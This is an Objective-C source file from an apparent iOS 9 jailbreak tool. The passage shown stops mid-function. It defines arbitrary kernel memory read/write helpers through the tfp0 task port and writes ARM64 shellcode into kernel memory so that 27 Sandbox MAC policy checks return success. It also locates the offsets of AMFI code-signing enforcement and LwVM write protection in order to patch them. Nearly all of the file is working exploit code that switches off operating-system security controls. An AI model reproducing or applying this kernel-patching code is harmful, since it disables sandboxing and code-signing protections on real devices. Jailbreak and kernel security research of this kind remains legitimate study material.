/*
 *  _unjail9.m
 *  kokeshidoll
 *
 *  Created by sakuRdev on 2021/12/02.
 *  Copyright (c) 2021 sakuRdev. All rights reserved.
 *
 *  Permission is hereby granted, free of charge, to any person obtaining a copy
 *  of this software and associated documentation files (the "Software"), to deal
 *  in the Software without restriction, including without limitation the rights
 *  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 *  copies of the Software, and to permit persons to whom the Software is
 *  furnished to do so, subject to the following conditions:
 *
 *  The above copyright notice and this permission notice shall be included in all
 *  copies or substantial portions of the Software.
 *
 *  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 *  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 *  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 *  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 *  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 *  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 *  SOFTWARE.
 *
 */

#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <stddef.h>

#include <mach/mach.h>
#include <mach-o/dyld.h>

#include <sys/mount.h>

//#include "unjail9.h"
#include "patchfinder64.h"

#include "mac.h"

#define PATCH_TFP0 1

#ifdef DEBUG
#define DEBUGLog(str, args...)\
do\
{\
NSLog(@str, ##args);\
} while(0)
#else
#define DEBUGLog(str, args...)
#endif

// GUI
extern void (*printLog)(const char *text, ...);

mach_port_t tfp0 = 0;

kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);
kern_return_t mach_vm_protect(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, boolean_t set_maximum, vm_prot_t new_protection);
kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);

static void copyin(void* to, uint64_t from, size_t size) {
    mach_vm_size_t outsize = size;
    size_t szt = size;
    if (size > 0x1000) {
        size = 0x1000;
    }
    size_t off = 0;
    while (1) {
        mach_vm_read_overwrite(tfp0, off+from, size, (mach_vm_offset_t)(off+to), &outsize);
        szt -= size;
        off += size;
        if (szt == 0) {
            break;
        }
        size = szt;
        if (size > 0x1000) {
            size = 0x1000;
        }
        
    }
}

static void copyout(uint64_t to, void* from, size_t size) {
    mach_vm_write(tfp0, to, (vm_offset_t)from, (mach_msg_type_number_t)size);
}

static uint64_t ReadAnywhere64(uint64_t addr) {
    uint64_t val = 0;
    copyin(&val, addr, 8);
    return val;
}

static uint64_t WriteAnywhere64(uint64_t addr, uint64_t val) {
    copyout(addr, &val, 8);
    return val;
}

static uint32_t ReadAnywhere32(uint64_t addr) {
    uint32_t val = 0;
    copyin(&val, addr, 4);
    return val;
}

static uint64_t WriteAnywhere32(uint64_t addr, uint32_t val) {
    copyout(addr, &val, 4);
    return val;
}

static uint8_t WriteAnywhere8(uint64_t addr, uint8_t val) {
    copyout(addr, &val, 1);
    return val;
}

static uint8_t *kdata = NULL;
static size_t ksize = 0;

static uint64_t kernel_entry = 0;
uint64_t kerndumpbase = -1;
static void *kernel_mh = 0;

static uint64_t KOFFSET(uint64_t base, uint64_t off)
{
    if(!off) {
#ifdef DEBUG
        NSLog(@"[ERROR] Failed to get koffset");
#endif
        return 0;
    }
#ifdef DEBUG
    NSLog(@"[KOFFSET] %llx", base+off);
#endif
    return base+off;
}

static int init_kernel(uint64_t base)
{
    unsigned i;
    uint8_t buf[0x4000];
    const struct mach_header *hdr = (struct mach_header *)buf;
    const uint8_t *q;
    uint64_t min = -1;
    uint64_t max = 0;
    
    copyin(buf, base, sizeof(buf));
    q = buf + sizeof(struct mach_header) + 4;
    
    for (i = 0; i < hdr->ncmds; i++) {
        const struct load_command *cmd = (struct load_command *)q;
        if (cmd->cmd == LC_SEGMENT_64) {
            const struct segment_command_64 *seg = (struct segment_command_64 *)q;
            if (min > seg->vmaddr) {
                min = seg->vmaddr;
            }
            if (max < seg->vmaddr + seg->vmsize) {
                max = seg->vmaddr + seg->vmsize;
            }
        }
        if (cmd->cmd == LC_UNIXTHREAD) {
            uint32_t *ptr = (uint32_t *)(cmd + 1);
            uint32_t flavor = ptr[0];
            struct {
                uint64_t x[29];    /* General purpose registers x0-x28 */
                uint64_t fp;    /* Frame pointer x29 */
                uint64_t lr;    /* Link register x30 */
                uint64_t sp;    /* Stack pointer x31 */
                uint64_t pc;     /* Program counter */
                uint32_t cpsr;    /* Current program status register */
            } *thread = (void *)(ptr + 2);
            if (flavor == 6) {
                kernel_entry = thread->pc;
            }
        }
        q = q + cmd->cmdsize;
    }
    
    kerndumpbase = min;
    ksize = max - min;
    
    kdata = malloc(ksize);
    if (!kdata) {
        return -1;
    }
    
    copyin(kdata, kerndumpbase, ksize);
    
    kernel_mh = kdata + base - min;
    
    return 0;
}


/* pangu9 method */
static void sbWriteCode(uint64_t shc, uint64_t x30_reg, uint64_t origret, uint64_t next)
{
    /*
     * Replace _memset.stub with shellcode in the following policy hook functions,
     * set x0 register to 0, and jump to ret.
     *
     *  mpo_proc_check_fork
     *  mpo_iokit_check_open
     *  mpo_mount_check_fsctl
     *  mpo_vnode_check_rename
     *  mpo_vnode_check_access
     *  mpo_vnode_check_chroot
     *  mpo_vnode_check_create
     *  mpo_vnode_check_deleteextattr
     *  mpo_vnode_check_exchangedata
     *  mpo_vnode_check_getattrlist
     *  mpo_vnode_check_getextattr
     *  mpo_vnode_check_ioctl
     *  mpo_vnode_check_link
     *  mpo_vnode_check_listextattr
     *  mpo_vnode_check_open
     *  mpo_vnode_check_readlink
     *  mpo_vnode_check_revoke
     *  mpo_vnode_check_setattrlist
     *  mpo_vnode_check_setextattr
     *  mpo_vnode_check_setflags
     *  mpo_vnode_check_setmode
     *  mpo_vnode_check_setowner
     *  mpo_vnode_check_setutimes
     *  mpo_vnode_check_stat
     *  mpo_vnode_check_truncate
     *  mpo_vnode_check_unlink
     *  mpo_file_check_mmap
     *
     */
    
    DEBUGLog("%llx: %llx, next: %llx", x30_reg, origret, next);
    
                                             // _shellcode: check x30 register to branch which function it came from.
    WriteAnywhere32(shc + 0x00, 0x58000110); //     ldr        x16, _x30_reg
    WriteAnywhere32(shc + 0x04, 0xeb1003df); //     cmp        x30, x16
    WriteAnywhere32(shc + 0x08, 0x54000060); //     b.eq       _ret0
    WriteAnywhere32(shc + 0x0c, 0x58000128); //     ldr        x8, _next
    WriteAnywhere32(shc + 0x10, 0xd61f0100); //     br         x8           // check the next x30 reg.
                                             //  _ret0: x0 to 0 and jump to ret of original functions.
    WriteAnywhere32(shc + 0x14, 0xd2800000); //     movz       x0, #0x0
    WriteAnywhere32(shc + 0x18, 0x58000088); //     ldr        x8, _origret
    WriteAnywhere32(shc + 0x1c, 0xd61f0100); //     br         x8
    
    WriteAnywhere64(shc + 0x20, x30_reg);    //  _x30_reg
    WriteAnywhere64(shc + 0x28, origret);    //  _origret
    WriteAnywhere64(shc + 0x30, next);       //  _next
}

static int kpatch9(uint64_t region, uint64_t lwvm_type)
{
    init_kernel(region);
    
    /*--- helper ---*/
    uint64_t ret0_gadget;
    uint64_t ret1_gadget;
    
    /*--- AMFI.kext ---*/
    // __DATA.__got
    uint64_t amfi_PE_i_can_has_debugger_got;
    uint64_t amfi_cs_enforcement_got;
    uint64_t amfi_vnode_isreg_got;
    
    // for shellcode
    uint64_t _amfi_execve_hook;
    uint64_t _vnode_isreg;
    uint64_t amfiBase;
    
    /*--- LwVM.kext ---*/
    // __DATA.__got
    uint64_t lwvm_krnl_conf_got;
    
    // jmpto
    uint64_t lwvm_jump;
    
    /*--- Sandbox.kext ---*/
    // policy_ops
    uint64_t sbops;
    
    // for shellcode
    uint64_t memset_stub;
    uint64_t sbBase;
    
    /*-- MAC policies --*/
    uint64_t proc_check_fork_ret;
    uint64_t proc_check_fork_lr;
    
    uint64_t iokit_check_open_ret;
    uint64_t iokit_check_open_lr;
    
    uint64_t mount_check_fsctl_ret;
    uint64_t mount_check_fsctl_lr;
    
    uint64_t vnode_check_rename_ret;
    uint64_t vnode_check_rename_lr_1;
    uint64_t vnode_check_rename_lr_2;
    uint64_t vnode_check_rename_lr_3;
    uint64_t vnode_check_rename_lr_4;
    
    uint64_t vnode_check_access_ret;
    uint64_t vnode_check_access_lr;
    
    uint64_t vnode_check_chroot_ret;
    uint64_t vnode_check_chroot_lr;
    
    uint64_t vnode_check_create_ret;
    uint64_t vnode_check_create_lr_1;
    uint64_t vnode_check_create_lr_2;
    uint64_t vnode_check_create_lr_3;
    
    uint64_t vnode_check_deleteextattr_ret;
    uint64_t vnode_check_deleteextattr_lr;
    
    uint64_t vnode_check_exchangedata_ret;
    uint64_t vnode_check_exchangedata_lr_1;
    uint64_t vnode_check_exchangedata_lr_2;
    
    uint64_t vnode_check_getattrlist_ret;
    uint64_t vnode_check_getattrlist_lr;
    
    uint64_t vnode_check_getextattr_ret;
    uint64_t vnode_check_getextattr_lr;
    
    uint64_t vnode_check_ioctl_ret;
    uint64_t vnode_check_ioctl_lr;
    
    uint64_t vnode_check_link_ret;
    uint64_t vnode_check_link_lr_1;
    uint64_t vnode_check_link_lr_2;
    uint64_t vnode_check_link_lr_3;
    
    uint64_t vnode_check_listextattr_ret;
    uint64_t vnode_check_listextattr_lr;
    
    uint64_t vnode_check_open_ret;
    uint64_t vnode_check_open_lr;
    
    uint64_t vnode_check_readlink_ret;
    uint64_t vnode_check_readlink_lr;
    
    uint64_t vnode_check_revoke_ret;
    uint64_t vnode_check_revoke_lr;
    
    uint64_t vnode_check_setattrlist_ret;
    uint64_t vnode_check_setattrlist_lr;
    
    uint64_t vnode_check_setextattr_ret;
    uint64_t vnode_check_setextattr_lr;
    
    uint64_t vnode_check_setflags_ret;
    uint64_t vnode_check_setflags_lr;
    
    uint64_t vnode_check_setmode_ret;
    uint64_t vnode_check_setmode_lr;
    
    uint64_t vnode_check_setowner_ret;
    uint64_t vnode_check_setowner_lr;
    
    uint64_t vnode_check_setutimes_ret;
    uint64_t vnode_check_setutimes_lr;
    
    uint64_t vnode_check_stat_ret;
    uint64_t vnode_check_stat_lr;
    
    uint64_t vnode_check_truncate_ret;
    uint64_t vnode_check_truncate_lr;
    
    uint64_t vnode_check_unlink_ret;
    uint64_t vnode_check_unlink_lr_1;
    uint64_t vnode_check_unlink_lr_2;
    
    uint64_t file_check_mmap_ret;
    uint64_t file_check_mmap_lr;
    
    // __DATA.__got
    uint64_t sb_PE_i_can_has_debugger_got;
    uint64_t sb_memset_got;
    uint64_t sb_vfs_rootvnode_got;
    
    // fn
    uint64_t vfs_rootvnode_fn;
    uint64_t rootvnode;
    uint64_t rootfs_vnode;
    
    // MAC setup
    struct mac_policy_ops mpc_ops;
    memset(&mpc_ops, '\0', sizeof(mpc_ops));
    
    
    DEBUGLog("Searching koffsets..");
    
    {
        DEBUGLog("gadget");
        if(!(ret0_gadget = KOFFSET(region, find_ret0_gadget(region, kdata, ksize)))) goto fail;
        if(!(ret1_gadget = KOFFSET(region, find_ret1_gadget(region, kdata, ksize)))) goto fail;
    }
    
    {
        DEBUGLog("AMFI __DATA.__got");
        if(!(amfi_PE_i_can_has_debugger_got = KOFFSET(region, find_amfi_PE_i_can_has_debugger_got(region, kdata, ksize)))) goto fail;
        if(!(amfi_cs_enforcement_got = KOFFSET(region, find_amfi_cs_enforcement_got(region, kdata, ksize)))) goto fail;
        if(!(amfi_vnode_isreg_got = KOFFSET(region, find_vnode_isreg_in_amfi_execve_hook(region, kdata, ksize)))) goto fail;
    }
    
    {
        DEBUGLog("AMFI shellcode");
        if(!(_amfi_execve_hook = KOFFSET(region, find_amfi_execve_hook(region, kdata, ksize)))) goto fail;
        
        _vnode_isreg = ReadAnywhere64(amfi_vnode_isreg_got); // 9.3.3: 0xffffff800414e214
        if(!_vnode_isreg) {
            DEBUGLog("[ERROR] Failed to read offset!");
            goto fail;
        }
    }
    
    {
        DEBUGLog("LwVM __DATA.__got");
        if(lwvm_type == 1){
            // 9.3.2-9.3.5
            if(!(lwvm_krnl_conf_got = KOFFSET(region, find_PE_i_can_has_kernel_configuration_got(region, kdata, ksize)))) goto fail;
        } else {
            // For 9.3.1 and below, find _PE_i_can_has_debugger.stub and bypass isWriteProtected check.
            if(!(lwvm_krnl_conf_got = KOFFSET(region, find_LwVM_PE_i_can_has_debugger_got(region, kdata, ksize)))) goto fail;
        }
        if(!(lwvm_jump = KOFFSET(region, find_lwvm_jump(region, kdata, ksize)))) goto fail;
    }
    
    {
        DEBUGLog("Sandbox ops");
        if(!(sbops = KOFFSET(region, find_sandbox_mac_policy_ops(region, kdata, ksize)))) goto fail;
    }
    
    {
        DEBUGLog("_memset.stub");
        if(!(memset_stub = KOFFSET(region, find_memset(region, kdata, ksize)))) goto fail; // or rk64(__got)
    }
    
    {
        DEBUGLog("MAC");
        mpc_ops.mpo_mount_check_remount         = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_remount));
        mpc_ops.mpo_vnode_check_exec            = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exec));
        mpc_ops.mpo_proc_check_fork             = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_fork));
        mpc_ops.mpo_iokit_check_open            = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_iokit_check_open));
        mpc_ops.mpo_mount_check_fsctl           = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_fsctl));
        mpc_ops.mpo_vnode_check_rename          = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename));
        mpc_ops.mpo_vnode_check_access          = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_access));
        mpc_ops.mpo_vnode_check_chroot          = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_chroot));
        mpc_ops.mpo_vnode_check_create          = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_create));
        mpc_ops.mpo_vnode_check_deleteextattr   = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr));
        mpc_ops.mpo_vnode_check_exchangedata    = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata));
        mpc_ops.mpo_vnode_check_getattrlist     = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist));
        mpc_ops.mpo_vnode_check_getextattr      = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr));
        mpc_ops.mpo_vnode_check_ioctl           = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl));
        mpc_ops.mpo_vnode_check_link            = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_link));
        mpc_ops.mpo_vnode_check_listextattr     = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr));
        mpc_ops.mpo_vnode_check_open            = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_open));
        mpc_ops.mpo_vnode_check_readlink        = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_readlink));
        mpc_ops.mpo_vnode_check_revoke          = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_revoke));
        mpc_ops.mpo_vnode_check_setattrlist     = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist));
        mpc_ops.mpo_vnode_check_setextattr      = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr));
        mpc_ops.mpo_vnode_check_setflags        = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setflags));
        mpc_ops.mpo_vnode_check_setmode         = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setmode));
        mpc_ops.mpo_vnode_check_setowner        = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setowner));
        mpc_ops.mpo_vnode_check_setutimes       = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes));
        mpc_ops.mpo_vnode_check_stat            = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_stat));
        mpc_ops.mpo_vnode_check_truncate        = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_truncate));
        mpc_ops.mpo_vnode_check_unlink          = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_unlink));
        mpc_ops.mpo_file_check_mmap             = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap));
        
        if(!mpc_ops.mpo_mount_check_remount||
           !mpc_ops.mpo_vnode_check_exec||
           !mpc_ops.mpo_proc_check_fork||
           !mpc_ops.mpo_iokit_check_open||
           !mpc_ops.mpo_mount_check_fsctl||
           !mpc_ops.mpo_vnode_check_rename||
           !mpc_ops.mpo_vnode_check_access||
           !mpc_ops.mpo_vnode_check_chroot||
           !mpc_ops.mpo_vnode_check_create||
           !mpc_ops.mpo_vnode_check_deleteextattr||
           !mpc_ops.mpo_vnode_check_exchangedata||
           !mpc_ops.mpo_vnode_check_getattrlist||
           !mpc_ops.mpo_vnode_check_getextattr||
           !mpc_ops.mpo_vnode_check_ioctl||
           !mpc_ops.mpo_vnode_check_link||
           !mpc_ops.mpo_vnode_check_listextattr||
           !mpc_ops.mpo_vnode_check_open||
           !mpc_ops.mpo_vnode_check_readlink||
           !mpc_ops.mpo_vnode_check_revoke||
           !mpc_ops.mpo_vnode_check_setattrlist||
           !mpc_ops.mpo_vnode_check_setextattr||
           !mpc_ops.mpo_vnode_check_setflags||
           !mpc_ops.mpo_vnode_check_setmode||
           !mpc_ops.mpo_vnode_check_setowner||
           !mpc_ops.mpo_vnode_check_setutimes||
           !mpc_ops.mpo_vnode_check_stat||
           !mpc_ops.mpo_vnode_check_truncate||
           !mpc_ops.mpo_vnode_check_unlink||
           !mpc_ops.mpo_file_check_mmap){
            DEBUGLog("[ERROR] Failed to read sbops!");
            goto fail;
        }
        
        // ret/x30 reg
        proc_check_fork_ret             = KOFFSET(region, find_proc_check_fork_ret(region, kdata, ksize, mpc_ops.mpo_proc_check_fork));
        proc_check_fork_lr              = KOFFSET(region, find_proc_check_fork_lr(region, kdata, ksize, mpc_ops.mpo_proc_check_fork));
        
        iokit_check_open_ret            = KOFFSET(region, find_iokit_check_open_ret(region, kdata, ksize, mpc_ops.mpo_iokit_check_open));
        iokit_check_open_lr             = KOFFSET(region, find_iokit_check_open_lr(region, kdata, ksize, mpc_ops.mpo_iokit_check_open));
        
        mount_check_fsctl_ret           = KOFFSET(region, find_mount_check_fsctl_ret(region, kdata, ksize, mpc_ops.mpo_mount_check_fsctl));
        mount_check_fsctl_lr            = KOFFSET(region, find_mount_check_fsctl_lr(region, kdata, ksize, mpc_ops.mpo_mount_check_fsctl));
        
        vnode_check_rename_ret          = KOFFSET(region, find_vnode_check_rename_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_rename));
        vnode_check_rename_lr_1         = KOFFSET(region, find_vnode_check_rename_lr_1(region, kdata, ksize, mpc_ops.mpo_vnode_check_rename));
        vnode_check_rename_lr_2         = KOFFSET(region, find_vnode_check_rename_lr_2(region, kdata, ksize, mpc_ops.mpo_vnode_check_rename));
        vnode_check_rename_lr_3         = KOFFSET(region, find_vnode_check_rename_lr_3(region, kdata, ksize, mpc_ops.mpo_vnode_check_rename));
        vnode_check_rename_lr_4         = KOFFSET(region, find_vnode_check_rename_lr_4(region, kdata, ksize, mpc_ops.mpo_vnode_check_rename));
        
        vnode_check_access_ret          = KOFFSET(region, find_vnode_check_access_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_access));
        vnode_check_access_lr           = KOFFSET(region, find_vnode_check_access_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_access));
        
        vnode_check_chroot_ret          = KOFFSET(region, find_vnode_check_chroot_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_chroot));
        vnode_check_chroot_lr           = KOFFSET(region, find_vnode_check_chroot_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_chroot));
        
        vnode_check_create_ret          = KOFFSET(region, find_vnode_check_create_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_create));
        vnode_check_create_lr_1         = KOFFSET(region, find_vnode_check_create_lr_1(region, kdata, ksize, mpc_ops.mpo_vnode_check_create));
        vnode_check_create_lr_2         = KOFFSET(region, find_vnode_check_create_lr_2(region, kdata, ksize, mpc_ops.mpo_vnode_check_create));
        vnode_check_create_lr_3         = KOFFSET(region, find_vnode_check_create_lr_3(region, kdata, ksize, mpc_ops.mpo_vnode_check_create));
        
        vnode_check_deleteextattr_ret   = KOFFSET(region, find_vnode_check_deleteextattr_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_deleteextattr));
        vnode_check_deleteextattr_lr    = KOFFSET(region, find_vnode_check_deleteextattr_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_deleteextattr));
        
        vnode_check_exchangedata_ret    = KOFFSET(region, find_vnode_check_exchangedata_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_exchangedata));
        vnode_check_exchangedata_lr_1   = KOFFSET(region, find_vnode_check_exchangedata_lr_1(region, kdata, ksize, mpc_ops.mpo_vnode_check_exchangedata));
        vnode_check_exchangedata_lr_2   = KOFFSET(region, find_vnode_check_exchangedata_lr_2(region, kdata, ksize, mpc_ops.mpo_vnode_check_exchangedata));
        
        vnode_check_getattrlist_ret     = KOFFSET(region, find_vnode_check_getattrlist_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_getattrlist));
        vnode_check_getattrlist_lr      = KOFFSET(region, find_vnode_check_getattrlist_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_getattrlist));
        
        vnode_check_getextattr_ret      = KOFFSET(region, find_vnode_check_getextattr_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_getextattr));
        vnode_check_getextattr_lr       = KOFFSET(region, find_vnode_check_getextattr_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_getextattr));
        
        vnode_check_ioctl_ret           = KOFFSET(region, find_vnode_check_ioctl_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_ioctl));
        vnode_check_ioctl_lr            = KOFFSET(region, find_vnode_check_ioctl_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_ioctl));
        
        vnode_check_link_ret            = KOFFSET(region, find_vnode_check_link_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_link));
        vnode_check_link_lr_1           = KOFFSET(region, find_vnode_check_link_lr_1(region, kdata, ksize, mpc_ops.mpo_vnode_check_link));
        vnode_check_link_lr_2           = KOFFSET(region, find_vnode_check_link_lr_2(region, kdata, ksize, mpc_ops.mpo_vnode_check_link));
        vnode_check_link_lr_3           = KOFFSET(region, find_vnode_check_link_lr_3(region, kdata, ksize, mpc_ops.mpo_vnode_check_link));
        
        vnode_check_listextattr_ret     = KOFFSET(region, find_vnode_check_listextattr_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_listextattr));
        vnode_check_listextattr_lr      = KOFFSET(region, find_vnode_check_listextattr_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_listextattr));
        
        vnode_check_open_ret            = KOFFSET(region, find_vnode_check_open_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_open));
        vnode_check_open_lr             = KOFFSET(region, find_vnode_check_open_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_open));
        
        vnode_check_readlink_ret        = KOFFSET(region, find_vnode_check_readlink_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_readlink));
        vnode_check_readlink_lr         = KOFFSET(region, find_vnode_check_readlink_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_readlink));
        
        vnode_check_revoke_ret          = KOFFSET(region, find_vnode_check_revoke_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_revoke));
        vnode_check_revoke_lr           = KOFFSET(region, find_vnode_check_revoke_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_revoke));
        
        vnode_check_setattrlist_ret     = KOFFSET(region, find_vnode_check_setattrlist_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_setattrlist));
        vnode_check_setattrlist_lr      = KOFFSET(region, find_vnode_check_setattrlist_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_setattrlist));
        
        vnode_check_setextattr_ret      = KOFFSET(region, find_vnode_check_setextattr_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_setextattr));
        vnode_check_setextattr_lr       = KOFFSET(region, find_vnode_check_setextattr_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_setextattr));
        
        vnode_check_setflags_ret        = KOFFSET(region, find_vnode_check_setflags_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_setflags));
        vnode_check_setflags_lr         = KOFFSET(region, find_vnode_check_setflags_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_setflags));
        
        vnode_check_setmode_ret         = KOFFSET(region, find_vnode_check_setmode_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_setmode));
        vnode_check_setmode_lr          = KOFFSET(region, find_vnode_check_setmode_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_setmode));
        
        vnode_check_setowner_ret        = KOFFSET(region, find_vnode_check_setowner_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_setowner));
        vnode_check_setowner_lr         = KOFFSET(region, find_vnode_check_setowner_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_setowner));
        
        vnode_check_setutimes_ret       = KOFFSET(region, find_vnode_check_setutimes_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_setutimes));
        vnode_check_setutimes_lr        = KOFFSET(region, find_vnode_check_setutimes_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_setutimes));
        
        vnode_check_stat_ret            = KOFFSET(region, find_vnode_check_stat_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_stat));
        vnode_check_stat_lr             = KOFFSET(region, find_vnode_check_stat_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_stat));
        
        vnode_check_truncate_ret        = KOFFSET(region, find_vnode_check_truncate_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_truncate));
        vnode_check_truncate_lr         = KOFFSET(region, find_vnode_check_truncate_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_truncate));
        
        vnode_check_unlink_ret          = KOFFSET(region, find_vnode_check_unlink_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_unlink));
        vnode_check_unlink_lr_1         = KOFFSET(region, find_vnode_check_unlink_lr_1(region, kdata, ksize, mpc_ops.mpo_vnode_check_unlink));
        vnode_check_unlink_lr_2         = KOFFSET(region, find_vnode_check_unlink_lr_2(region, kdata, ksize, mpc_ops.mpo_vnode_check_unlink));

        file_check_mmap_ret             = KOFFSET(region, find_file_check_mmap_ret(region, kdata, ksize, mpc_ops.mpo_file_check_mmap));
        file_check_mmap_lr              = KOFFSET(region, find_file_check_mmap_lr(region, kdata, ksize, mpc_ops.mpo_file_check_mmap));
        
        if(!proc_check_fork_ret||
           !proc_check_fork_lr||
           !iokit_check_open_ret||
           !iokit_check_open_lr||
           !mount_check_fsctl_ret||
           !mount_check_fsctl_lr||
           !vnode_check_rename_ret||
           !vnode_check_rename_lr_1||
           !vnode_check_rename_lr_2||
           !vnode_check_rename_lr_3||
           !vnode_check_rename_lr_4||
           !vnode_check_access_ret||
           !vnode_check_access_lr||
           !vnode_check_chroot_ret||
           !vnode_check_chroot_lr||
           !vnode_check_create_ret||
           !vnode_check_create_lr_1||
           !vnode_check_create_lr_2||
           !vnode_check_create_lr_3||
           !vnode_check_deleteextattr_ret||
           !vnode_check_deleteextattr_lr||
           !vnode_check_exchangedata_ret||
           !vnode_check_exchangedata_lr_1||
           !vnode_check_exchangedata_lr_2||
           !vnode_check_getattrlist_ret||
           !vnode_check_getattrlist_lr||
           !vnode_check_getextattr_ret||
           !vnode_check_getextattr_lr||
           !vnode_check_ioctl_ret||
           !vnode_check_ioctl_lr||
           !vnode_check_link_ret||
           !vnode_check_link_lr_1||
           !vnode_check_link_lr_2||
           !vnode_check_link_lr_3||
           !vnode_check_listextattr_ret||
           !vnode_check_listextattr_lr||
           !vnode_check_open_ret||
           !vnode_check_open_lr||
           !vnode_check_readlink_ret||
           !vnode_check_readlink_lr||
           !vnode_check_revoke_ret||
           !vnode_check_revoke_lr||
           !vnode_check_setattrlist_ret||
           !vnode_check_setattrlist_lr||
           !vnode_check_setextattr_ret||
           !vnode_check_setextattr_lr||
           !vnode_check_setflags_ret||
           !vnode_check_setflags_lr||
           !vnode_check_setmode_ret||
           !vnode_check_setmode_lr||
           !vnode_check_setowner_ret||
           !vnode_check_setowner_lr||
           !vnode_check_setutimes_ret||
           !vnode_check_setutimes_lr||
           !vnode_check_stat_ret||
           !vnode_check_stat_lr||
           !vnode_check_truncate_ret||
           !vnode_check_truncate_lr||
           !vnode_check_unlink_ret||
           !vnode_check_unlink_lr_1||
           !vnode_check_unlink_lr_2||
           !file_check_mmap_ret||
           !file_check_mmap_lr){
            DEBUGLog("[ERROR] Failed to search ret/lr!");
            goto fail;
        }
        
    }
    
    {
